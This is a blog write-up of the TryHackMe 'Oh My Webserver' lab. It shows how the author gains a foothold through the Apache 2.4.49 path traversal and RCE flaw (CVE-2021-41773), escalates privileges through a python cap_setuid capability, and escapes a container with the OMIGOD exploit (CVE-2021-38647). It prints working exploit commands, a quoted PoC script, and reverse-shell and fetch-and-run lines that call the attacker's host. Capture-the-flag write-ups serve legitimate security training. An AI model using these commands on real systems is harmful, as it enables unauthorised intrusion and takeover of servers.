---
layout: post
title: TryHackMe - Oh My Webserver
date: 2023-09-07 19:32:00 +0700
tags: [security, linux, beginner, new]
toc: true
---

<p class="message">Can you root me?</p>

## Enumeration

### Nmap

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 5000 -Pn ohmyweb.thm
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-07 05:56 EDT
Nmap scan report for ohmyweb.thm (10.10.4.21)
Host is up (0.19s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.71 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -Pn -p 22,80 ohmyweb.thm
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-07 05:38 EDT
Nmap scan report for ohmyweb.thm (10.10.4.21)
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0d188762a9379d391046d25160e56d4 (RSA)
|   256 91185c2c5ef8993c9a1f0424300eaa9b (ECDSA)
|_  256 d1632a36dd94cf3c573e8ae88500caf6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Consult - Business Consultancy Agency Template | Home
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 5.4 (86%), Linux 2.6.32 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   183.34 ms 10.9.0.1
2   237.73 ms ohmyweb.thm (10.10.4.21)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.30 seconds
```

From this point, I took time to enumerate the **HTTP** service on port `80` such as _dir scan_. However, nothing interesting had been found.

### Dir Scan

```
┌──(kali㉿kali)-[~/Wordlists]
└─$ gobuster dir -w directory-list-2.3-medium.txt -t 50 --no-error -u http://ohmyweb.thm
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ohmyweb.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 234] [--> http://ohmyweb.thm/assets/]
Progress: 220548 / 220549 (100.00%)
===============================================================
Finished
===============================================================
```

```
┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ curl http://ohmyweb.thm/assets/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /assets</title>
 </head>
 <body>
<h1>Index of /assets</h1>
<ul><li><a href="/"> Parent Directory</a></li>
<li><a href=".DS_Store"> .DS_Store</a></li>
<li><a href="css/"> css/</a></li>
<li><a href="fonts/"> fonts/</a></li>
<li><a href="images/"> images/</a></li>
<li><a href="js/"> js/</a></li>
</ul>
</body></html>
```

```
┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ curl http://ohmyweb.thm/assets/js/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /assets/js</title>
 </head>
 <body>
<h1>Index of /assets/js</h1>
<ul><li><a href="/assets/"> Parent Directory</a></li>
<li><a href=".DS_Store"> .DS_Store</a></li>
<li><a href="bootstrap.min.js"> bootstrap.min.js</a></li>
<li><a href="circles.min.js"> circles.min.js</a></li>
<li><a href="headroom.min.js"> headroom.min.js</a></li>
<li><a href="imagesloaded.pkgd.min.js"> imagesloaded.pkgd.min.js</a></li>
<li><a href="isotope.pkgd.min.js"> isotope.pkgd.min.js</a></li>
<li><a href="jquery.appear.min.js"> jquery.appear.min.js</a></li>
<li><a href="jquery.counterup.min.js"> jquery.counterup.min.js</a></li>
<li><a href="jquery.magnific-popup.min.js"> jquery.magnific-popup.min.js</a></li>
<li><a href="jquery.nav.js"> jquery.nav.js</a></li>
<li><a href="main-min.js"> main-min.js</a></li>
<li><a href="main.js"> main.js</a></li>
<li><a href="plugins.js"> plugins.js</a></li>
<li><a href="popper.min.js"> popper.min.js</a></li>
<li><a href="scrollIt.min.js"> scrollIt.min.js</a></li>
<li><a href="slick.min.js"> slick.min.js</a></li>
<li><a href="vendor/"> vendor/</a></li>
<li><a href="waypoints.min.js"> waypoints.min.js</a></li>
<li><a href="wow.min.js"> wow.min.js</a></li>
</ul>
</body></html>
```

### Apache server 2.4.49 → CVE-2021-41773

Then the apache version `2.4.49` impress me. After researching, I found out it was the vulnerability related to the **CVE-2021-41173** (LFI & RCE) ⇒ Read more from [this](https://github.com/mr-exo/CVE-2021-41773).

Or viewing the PoC from the exploit path using `searchsploit`:

```
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```

To verify the target server is vulnerable, I simply use the `curl` with the `/cgi-bin` path:

```
┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ curl http://ohmyweb.thm/cgi-bin/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
```

The response code is `403` which means it actually enabled the **mod_cgi**. Therefore, I had another simple test with a malicious payload which has been double URL-encoded:

```
┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ curl http://ohmyweb.thm/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh --data 'echo Content-Type: text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## Exploit → Gain Access

To perform a fulfilled attack, I need to establish a reverse shell for better interact with the server:

```
┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ curl http://ohmyweb.thm/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.9.63.75/4444 0>&1'
```

However, executing the above command within running listener on my local machine, I still do not get the shell back. Then, I need to manually embed the payload into a particular shell → Transfer it to the server → Execute it:

```
┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ ls -l shell.sh
-rw-r--r-- 1 kali kali 38 Sep  7 06:53 shell.sh

┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ cat shell.sh
bash >& /dev/tcp/10.9.63.75/4444 0>&1

┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.114.109 - - [07/Sep/2023 07:18:20] "GET /shell.sh HTTP/1.1" 200 -
```

```
┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ curl http://ohmyweb.thm/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh --data 'echo Content-Type: text/plain; echo; curl http://10.9.63.75:8000/shell.sh -o /tmp/shell.sh'

# verify that the shell has been placed
┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ curl http://ohmyweb.thm/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh --data 'echo Content-Type: text/plain; echo; ls -l /tmp/'
total 4
-rw-r--r-- 1 daemon daemon 38 Sep  7 10:56 shell.sh

┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ curl http://ohmyweb.thm/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh --data 'echo Content-Type: text/plain; echo; chmod +x /tmp/shell.sh'

┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ curl http://ohmyweb.thm/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh --data 'echo Content-Type: text/plain; echo; ls -l /tmp/'
total 4
-rwxr-xr-x 1 daemon daemon 38 Sep  7 10:56 shell.sh
```

```
┌──(kali㉿kali)-[~/TryHackMe/ohmyweb]
└─$ curl http://ohmyweb.thm/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh --data 'echo Content-Type: text/plain; echo; bash /tmp/shell.sh'
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.63.75] from (UNKNOWN) [10.10.114.109] 48372
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
python3 -c "import pty;pty.spawn('/bin/bash')"
daemon@4a70924bafa0:/bin$
```

## Privilege Escalation → root

I had checked the `/home/` directory but there is no other available user → The only user that I have to escalate is the **root.**

To perform the privilege escalation, I do some common checks such as **cronjobs**, **capabilities**:

```
daemon@4a70924bafa0:/bin$ cat /etc/crontab
cat /etc/crontab
cat: /etc/crontab: No such file or directory
daemon@4a70924bafa0:/bin$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
daemon@4a70924bafa0:/bin$ ls -l /usr/bin/python3.7
ls -l /usr/bin/python3.7
-rwxr-xr-x 1 root root 4877888 Jan 22  2021 /usr/bin/python3.7
```

I simply use the exploit payload to get the **root** user following these steps:

```
daemon@4a70924bafa0:/bin$ /usr/bin/python3.7 -c "import os;os.setuid(0); os.system('/bin/bash')"
<-c "import os;os.setuid(0); os.system('/bin/bash')"
root@4a70924bafa0:/bin# whoami
whoami
root
root@4a70924bafa0:/bin# id
id
uid=0(root) gid=1(daemon) groups=1(daemon)
```

Read more at [this source](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/).

Then I easily navigate to the `/root/` directory and get the user flag:

```
root@4a70924bafa0:/bin# cd /root
cd /root
root@4a70924bafa0:/root# ls -l
ls -l
total 4
-rw-r--r-- 1 root root 38 Oct  8  2021 user.txt
root@4a70924bafa0:/root# cat user.txt
cat user.txt
THM{REDACTED}
```

## OMI server - CVE-2021-38647

The only available flag located in the `/root/` directory is the user flag. So, where is the root flag?

```
root@4a70924bafa0:/root# find / -name "root.txt"
find / -name "root.txt"
find: ‘/proc/1/map_files’: Permission denied
find: ‘/proc/8/map_files’: Permission denied
find: ‘/proc/9/map_files’: Permission denied
find: ‘/proc/10/map_files’: Permission denied
find: ‘/proc/11/map_files’: Permission denied
find: ‘/proc/93/map_files’: Permission denied
find: ‘/proc/142/map_files’: Permission denied
find: ‘/proc/143/map_files’: Permission denied
find: ‘/proc/145/map_files’: Permission denied
find: ‘/proc/146/map_files’: Permission denied
find: ‘/proc/150/map_files’: Permission denied
find: ‘/proc/151/map_files’: Permission denied
```

I got stuck at here for a half hour, then I started to enumerate the communicating hosts and found this interested thing:

```
root@4a70924bafa0:/root# netstat -antup
netstat -antup
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0    173 172.17.0.2:48372        10.9.63.75:4444         ESTABLISHED -
```

There are 2 **Local Address** with `0.0.0.0` is the default one which is normally attempt to the `127.0.0.1` or `localhost`; the second one is `172.17.0.2` is connecting with my own local machine. Let’s verify the IP Address one more time:

```
root@4a70924bafa0:/root# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 202  bytes 17516 (17.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 151  bytes 72028 (70.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

As regular, the host address should be displayed at `172.17.0.1` → Where is it?

I need to run the `nmap` scanning on this server with this address to explore what are running on. I transferred my own `nmap` service from my local machine but it did not work:

```
root@4a70924bafa0:/tmp# ./nmap -p- --min-rate 5000 127.17.0.1
./nmap -p- --min-rate 5000 127.17.0.1
./nmap: error while loading shared libraries: libssl.so.3: cannot open shared object file: No such file or directory
```

To solve this, I downloaded the `nmap` package from [andrew-github](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and then transferred it to the target server:

```
root@4a70924bafa0:/tmp# curl http://10.9.63.75:8000/nmap -o nmap
curl http://10.9.63.75:8000/nmap -o nmap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0   968k      0  0:00:05  0:00:05 --:--:-- 1092k
root@4a70924bafa0:/tmp# ls -l
ls -l
total 5812
-rw-r--r-- 1 root   daemon 5944464 Sep  7 11:14 nmap
-rwxr-xr-x 1 daemon daemon      38 Sep  7 10:56 shell.sh
```

```
root@4a70924bafa0:/tmp# chmod +x nmap
chmod +x nmap
root@4a70924bafa0:/tmp# ./nmap -p- --min-rate 5000 172.17.0.1
./nmap -p- --min-rate 5000 172.17.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-09-07 11:18 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.0014s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:AB:4B:3D:B8 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 39.77 seconds
```

Notice that the port `5986` is opened and `5985` is closed. Take a small research and I find that these ports are related to the **OMI Agent** and the **CVE-2021-38647**. Read more from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-omi).

From [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-omi) , it also leads me to the full exploit from this [source](https://github.com/horizon3ai/CVE-2021-38647). Then I keep download it to my local workspace → Transfer the binary to the target:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ wget https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/main/omigod.py
--2023-09-07 07:17:36--  https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/main/omigod.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2720 (2.7K) [text/plain]
Saving to: ‘omigod.py’

omigod.py                    100%[==============================================>]   2.66K  --.-KB/s    in 0s

2023-09-07 07:17:37 (63.6 MB/s) - ‘omigod.py’ saved [2720/2720]


┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.114.109 - - [07/Sep/2023 07:18:20] "GET /omigod.py HTTP/1.1" 200 -
```

```
root@4a70924bafa0:/tmp# curl http://10.9.63.75:8000/omigod.py -o exploit.py
curl http://10.9.63.75:8000/omigod.py -o exploit.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2720  100  2720    0     0   7292      0 --:--:-- --:--:-- --:--:--  7292
root@4a70924bafa0:/tmp# ls -l
ls -l
total 5816
-rw-r--r-- 1 root   daemon    2720 Sep  7 11:20 exploit.py
-rwxr-xr-x 1 root   daemon 5944464 Sep  7 11:14 nmap
-rwxr-xr-x 1 daemon daemon      38 Sep  7 10:56 shell.sh
```

Next, I use the `.py` file to exploit the vulnerability:

```
root@4a70924bafa0:/tmp# python3 exploit.py -t 172.17.0.1 -c id
python3 exploit.py -t 172.17.0.1 -c id
uid=0(root) gid=0(root) groups=0(root)
```

The exploit script has worked successfully. Finally, I replace the `id` payload with commands to enumerate the **root flag** and read it:

```
root@4a70924bafa0:/tmp# python3 exploit.py -t 172.17.0.1 -c "find / -name 'root.txt'"
<ploit.py -t 172.17.0.1 -c "find / -name 'root.txt'"
/root/root.txt
```

```
root@4a70924bafa0:/tmp# python3 exploit.py -t 172.17.0.1 -c "cat /root/root.txt"
<n3 exploit.py -t 172.17.0.1 -c "cat /root/root.txt"
THM{REDACTED}
```
